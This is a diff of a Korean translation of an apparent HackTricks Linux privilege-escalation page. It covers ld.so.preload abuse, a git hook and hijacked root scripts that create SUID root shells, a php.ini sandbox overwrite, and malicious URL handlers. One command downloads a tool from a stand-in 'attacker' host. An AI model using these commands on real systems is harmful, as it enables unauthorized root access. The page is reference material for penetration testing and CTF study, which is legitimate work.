@@ -5,7 +5,7 @@
 ### /etc/ld.so.preload
 
 이 파일은 **`LD_PRELOAD`** 환경 변수처럼 동작하지만 **SUID binaries**에서도 작동합니다.\
-만약 이 파일을 생성하거나 수정할 수 있다면, 실행되는 모든 바이너리에 로드될 **라이브러리의 경로**를 추가하면 됩니다.
+만약 이 파일을 생성하거나 수정할 수 있다면, 실행되는 각 바이너리와 함께 로드될 라이브러리의 **경로를 추가**하면 됩니다.
 
 예: `echo "/tmp/pe.so" > /etc/ld.so.preload`
 ```c
@@ -24,9 +24,9 @@ system("/bin/bash");
 ```
 ### Git hooks
 
-[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)는 git 리포지토리에서 commit이 생성되거나 merge 같은 다양한 이벤트에서 **scripts**가 **run**되는 기능입니다. 따라서 **privileged script or user**가 이러한 작업을 자주 수행하고 `.git` 폴더에 쓸 수 있다면, 이는 **privesc**에 이용될 수 있습니다.
+[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)는 **스크립트**로, git 리포지토리에서 commit이 생성되거나 merge 같은 다양한 **이벤트**에서 **실행**됩니다. 따라서 **권한 있는 스크립트 또는 사용자**가 이러한 작업을 자주 수행하고 **`.git` 폴더에 쓸 수 있다면**, 이것을 이용해 **privesc**할 수 있습니다.
 
-예를 들어, git repo의 **`.git/hooks`**에 **script**를 생성하면 새 commit이 생성될 때마다 항상 실행되도록 할 수 있습니다:
+For example, It's possible to **스크립트를 생성** in a git repo in **`.git/hooks`** so it's always executed when a new commit is created:
 ```bash
 echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
 chmod +x pre-commit
@@ -39,13 +39,29 @@ TODO
 
 TODO
 
+### Overwrite a restrictive `php.ini` used by a privileged PHP sandbox
+
+일부 커스텀 데몬은 사용자 제공 PHP를 `php`를 제한된 **`php.ini`**와 함께 실행해 검증합니다(예: `disable_functions=exec,system,...`). 샌드박스된 코드가 여전히 **어떤 쓰기 primitive**(예: `file_put_contents`)를 가지고 있고 데몬이 사용하는 **정확한 `php.ini` 경로**에 접근할 수 있다면, 해당 설정을 **덮어써 제한을 해제**한 뒤 권한이 상승된 상태로 실행되는 두 번째 페이로드를 제출할 수 있습니다.
+
+Typical flow:
+
+1. First payload overwrites the sandbox config.
+2. Second payload executes code now that dangerous functions are re-enabled.
+
+Minimal example (replace the path used by the daemon):
+```php
+<?php
+file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
+```
+If the daemon runs as root (or validates with root-owned paths), the second execution yields a root context. This is essentially **privilege escalation via config overwrite** when the sandboxed runtime can still write files.
+
 ### binfmt_misc
 
-`/proc/sys/fs/binfmt_misc`에 있는 파일은 어떤 바이너리가 어떤 유형의 파일을 실행해야 하는지를 나타냅니다. TODO: 일반적인 파일 형식이 열려 있을 때 이를 악용해 rev shell을 실행하기 위한 조건을 확인하세요.
+The file located in `/proc/sys/fs/binfmt_misc` indicates which binary should execute whic type of files. TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.
 
 ### Overwrite schema handlers (like http: or https:)
 
-쓰기 권한이 있는 공격자는 피해자의 구성 디렉터리에 파일을 교체하거나 생성해 시스템 동작을 변경하고 원치 않는 코드 실행을 유발할 수 있습니다. `$HOME/.config/mimeapps.list` 파일을 수정해 HTTP 및 HTTPS URL 핸들러를 악성 파일로 지정하면(예: `x-scheme-handler/http=evil.desktop`로 설정) **http 또는 https 링크를 클릭하면 해당 `evil.desktop` 파일에 지정된 코드가 실행됩니다**. 예를 들어, `$HOME/.local/share/applications`에 있는 `evil.desktop`에 다음과 같은 악성 코드를 배치하면 외부 URL을 클릭할 때 포함된 명령이 실행됩니다:
+쓰기 권한이 있는 공격자는 피해자의 설정 디렉터리에 있는 파일을 쉽게 교체하거나 생성해 시스템 동작을 변경하고 의도치 않은 코드 실행을 유발할 수 있습니다. `$HOME/.config/mimeapps.list` 파일을 수정해 HTTP 및 HTTPS URL 핸들러를 악성 파일로 가리키도록 하면(예: `x-scheme-handler/http=evil.desktop`로 설정), 공격자는 **http 또는 https 링크를 클릭하면 해당 `evil.desktop` 파일에 지정된 코드가 실행되도록** 보장할 수 있습니다. 예를 들어 `$HOME/.local/share/applications`에 `evil.desktop`에 다음과 같은 악성 코드를 두면 외부 URL을 클릭할 때 포함된 명령이 실행됩니다:
 ```bash
 [Desktop Entry]
 Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
@@ -56,16 +72,16 @@ For more info check [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db
 
 ### Root가 실행하는 user-writable scripts/binaries
 
-권한 있는 워크플로우가 `/bin/sh /home/username/.../script` (또는 비권한 사용자 소유 디렉터리 내부의 any binary)을 실행하면, you can hijack it:
+특권 워크플로우가 `/bin/sh /home/username/.../script` (또는 비특권 사용자가 소유한 디렉터리 안에 있는 어떤 바이너리) 같은 것을 실행한다면, 이를 가로챌 수 있습니다:
 
-- **실행 감지:** root가 사용자 제어 경로를 호출하는 것을 포착하기 위해 [pspy](https://github.com/DominicBreuker/pspy)로 프로세스를 모니터링하세요:
+- **실행 감지:** 프로세스를 [pspy](https://github.com/DominicBreuker/pspy)로 모니터링하여 root가 사용자 제어 경로를 호출하는 것을 포착하세요:
 ```bash
 wget http://attacker/pspy64 -O /dev/shm/pspy64
 chmod +x /dev/shm/pspy64
 /dev/shm/pspy64   # wait for root commands pointing to your writable path
 ```
-- **Confirm writeability:** 대상 파일과 해당 디렉터리가 모두 당신의 사용자로 소유되어 있고 쓰기 가능한지 확인하세요.
-- **Hijack the target:** 원본 binary/script를 백업하고 SUID shell(또는 다른 root action)을 생성하는 payload를 심은 다음 권한을 복원하세요:
+- **Confirm writeability:** 대상 파일과 해당 디렉터리가 사용자 계정으로 소유되었거나 쓰기 가능한지 확인하세요.
+- **Hijack the target:** 원본 binary/script를 백업하고 payload를 떨어뜨려 SUID shell (or any other root action)을 생성한 다음 권한을 복원하세요:
 ```bash
 mv server-command server-command.bk
 cat > server-command <<'EOF'
@@ -76,10 +92,11 @@ chmod 6777 /tmp/rootshell
 EOF
 chmod +x server-command
 ```
-- **권한 있는 동작을 트리거하세요** (예: UI 버튼을 눌러 helper를 생성). 루트가 하이재킹된 경로를 다시 실행하면 `./rootshell -p`로 상승된 쉘을 획득하세요.
+- **권한 있는 동작을 트리거하세요** (예: 헬퍼를 생성하는 UI 버튼을 누름). root가 가로채진 경로를 다시 실행하면, 권한 상승된 shell을 `./rootshell -p`로 획득하세요.
 
-## References
+## 참고자료
 
 - [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
+- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
 
 {{#include ../../banners/hacktricks-training.md}}
